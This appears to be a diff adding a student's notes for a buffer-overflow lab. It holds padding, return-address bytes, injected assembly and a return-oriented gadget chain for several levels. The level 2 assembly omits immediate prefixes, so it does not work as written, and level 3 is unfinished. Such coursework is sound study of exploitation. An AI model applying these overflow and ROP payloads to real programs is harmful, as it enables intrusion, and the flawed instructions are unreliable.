@@ -1,0 +1,76 @@
+=================================================
+level 1 stack
+
+---------test
+
+8 byte rip
+---------getbuf
+40 byte buf  -> %rdi
+8 byte rip
+---------Gets
+
+level 1 answer:
+00 00 00 00 * 10
+address of touch1: 00000000004017c0
+c0 17 40 00
+00 00 00 00
+
+===================================================
+level 2 stack
+
+---------test
+
+8 byte rip
+---------getbuf
+40 byte buf  -> %rdi
+8 byte rip
+---------Gets
+
+analysis:
+	mov cookie, %rdi
+	push address of touch2
+	retq
+
+cookie: 0x59b997fa 
+address of touch2: 00000000004017ec 
+
+level2 answer:
+
+movq 0x59b997fa, %rdi
+pushq 0x4017ec
+retq
+filling 0....
+____________________
+address of my code (8 byte): 0x5561dc78 (&buf[0])
+
+======================================================
+level3
+
+analysis:
+	mov string, %rdi
+	pushq touch3
+	retq
+
+
+=====================================================
+level4
+0x4019ab  58 (popq %rax)
+		  90 (nop)
+		  c3 (ret)
+		
+0x4019a2 48 89 c7 (movq %rax, %rdi)
+         c3 (ret)
+
+cookie: 0x59b997fa
+touch2: 4017ec
+
+40 * 0
+0x4019ab (8bytes)
+cookie (8bytes)
+0x4019a2 (8bytes)
+touch2 (8bytes)
+
+
+
+
+
